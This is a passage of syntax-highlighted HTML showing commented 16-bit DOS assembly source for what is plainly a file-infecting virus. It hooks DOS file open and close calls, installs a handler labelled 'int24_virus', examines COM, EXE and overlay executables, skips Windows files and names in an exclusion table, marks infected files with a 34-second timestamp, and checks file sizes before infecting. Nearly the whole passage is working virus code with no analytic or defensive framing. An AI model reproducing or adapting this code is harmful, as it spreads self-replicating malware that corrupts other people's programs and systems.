         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">origin_cs</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; Add segment of beginning of code</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">stack_seg</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; Add segment of beginning of code</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,[</span><span class="sc5">stack_seg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SS = stack segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,[</span><span class="sc5">stack_ptr</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">origin_cs</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save original code segment at st...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">origin_ip</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save original intruction pointer...</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; BX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "   "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; ES =    "    "   "   "     "     "</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_retro</span><span class="sc0">
</span><span class="sc5">test_close</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_close</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to not_close</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; Standard file handle?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">int21_exit_</span><span class="sc0">     </span><span class="sc1">; Below? Jump to int21_exit_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BP = file handle</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tst_ext_open</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">not_close</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; Zero BP</span><span class="sc0">
</span><span class="sc5">tst_ext_open</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc0">      </span><span class="sc1">; Extended open/create?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_ext_open</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to not_ext_open</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
</span><span class="sc5">not_ext_open</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">prepare_exam</span><span class="sc0">
</span><span class="sc5">int21_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21_exit</span><span class="sc0">

</span><span class="sc5">prepare_exam</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Prepare filename examination</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">        </span><span class="sc1">; Get interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">int24_virus</span><span class="sc0">  </span><span class="sc1">; DX = offset of int24_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xchg_i13_i40</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Close file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_close_</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to not_close_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0">        </span><span class="sc1">; Open file (read)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">prepare_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to prepare_exit</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_examine</span><span class="sc0">
</span><span class="sc5">not_close_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; AX = file handle</span><span class="sc0">
</span><span class="sc5">call_examine</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">examine_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">      </span><span class="sc1">; Close file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">
</span><span class="sc5">prepare_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xchg_i13_i40</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">        </span><span class="sc1">; Set interrupt vector 24h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">examine_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Examine COM/EXE/Overlay file</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = file handle</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Save BX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1220h</span><span class="sc0">        </span><span class="sc1">; Get system file table number</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">pop_bx_exit</span><span class="sc0">     </span><span class="sc1">; Error? Jump to pop_bx_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1216h</span><span class="sc0">        </span><span class="sc1">; Get address of system FCB</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; BL = system file table entry</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
</span><span class="sc5">pop_bx_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">examine_exit</span><span class="sc0">    </span><span class="sc1">; Error? Jump to examine_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">sft_offset</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">     </span><span class="sc1">; Store offset of system file table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">sft_segment</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">; Store segment of system file table</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'VO'</span><span class="sc0">    </span><span class="sc1">; Overlay executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_name</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to examine_name</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">    </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_exe</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to examine_exe</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_name</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to examine_name</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">examine_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">examine_exe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">    </span><span class="sc1">; EXE executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_exe_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to examine_exe_</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">examine_exit</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">examine_exe_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2Ah</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_name</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to examine_name</span><span class="sc0">
</span><span class="sc5">examine_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">examine_name</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; AX = offset of system file table...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; AX = offset of filename</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">table_begin</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc0">  </span><span class="sc1">; SI = offset of table_begin - 06h</span><span class="sc0">
</span><span class="sc5">examine_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">      </span><span class="sc1">; SI = offset of next filename in ...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Save SI at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">      </span><span class="sc1">; Compare six bytes</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">       </span><span class="sc1">; Compare filename with table of f...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">          </span><span class="sc1">; Load SI from stack</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tst_loop_end</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to tst_loop_end</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">examine_exit</span><span class="sc0">
</span><span class="sc5">tst_loop_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">table_end</span><span class="sc4">-</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_loop</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to examine_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; DI = offset of system file table...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AL = file time</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00011111b</span><span class="sc0">    </span><span class="sc1">; AL = seconds of file time</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">    </span><span class="sc1">; Already infected (34 seconds)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to read_file</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_sof</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; COM executable</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_win</span><span class="sc0">        </span><span class="sc1">; Equal? Jump to find_win</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_win</span><span class="sc0">        </span><span class="sc1">; Equal? Jump to find_win</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_filesize</span><span class="sc0">    </span><span class="sc1">; COM executable? Jump to tst_file...</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
</span><span class="sc5">find_win</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc0">      </span><span class="sc1">; Search through eighty-four bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; SI = offset of file_buffer + 200h</span><span class="sc0">
</span><span class="sc5">win_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of file_buffer</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'W'</span><span class="sc0">              </span><span class="sc1">; Found first character of the st...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">jmp_win_loop</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to jmp_win_loop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; AL = byte of file_buffer</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc0">              </span><span class="sc1">; Found second character of the s...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">jmp_win_loop</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to jmp_win_loop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AL = byte of file_buffer</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01011111b</span><span class="sc0">    </span><span class="sc1">; Upcase character</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">              </span><span class="sc1">; Found third character of the st...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to infect_exit</span><span class="sc0">
</span><span class="sc5">jmp_win_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">win_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE/Overlay executable</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">tst_filesize</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; AX = filesize</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Filesize too small? Jump to infe...</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_com_size</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_com_size</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Filesize too large? Jump to infe...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mark_file</span><span class="sc0">

         </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">tst_com_size</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fefeh</span><span class="sc4">-(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">108h</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Filesize too large? Jump to infe...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">infect_exit</span><span class="sc0">     </span><span class="sc1">; Filesize too large? Jump to infe...</span><span class="sc0">

